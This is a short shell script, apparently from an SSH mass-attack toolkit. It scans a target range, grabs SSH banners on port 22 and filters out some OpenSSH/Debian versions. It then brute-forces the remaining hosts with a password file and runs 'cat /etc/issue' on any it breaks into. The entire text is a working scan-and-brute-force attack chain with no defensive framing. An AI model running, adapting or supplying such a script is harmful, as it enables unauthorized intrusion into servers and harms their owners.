rm -rf bios.txt
rm -rf scan.log
rm -rf mfu.txt
rm -rf banner.log
sleep 2
./port_scan $1 > scan2.log
sleep 25
./banner scan2.log 22 5000
pkill banner
sleep 1
sed -i /'Debian-5ubuntu1/d' banner.log
sed -i /'Debian-10+deb9u2/d' banner.log
sed -i /'SSH-2.0-OpenSSH_6.7p1/d' banner.log
cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> mfu2.txt
./brute 7500 -f mfu2.txt pass_file 22 "cat /etc/issue"
sleep 5

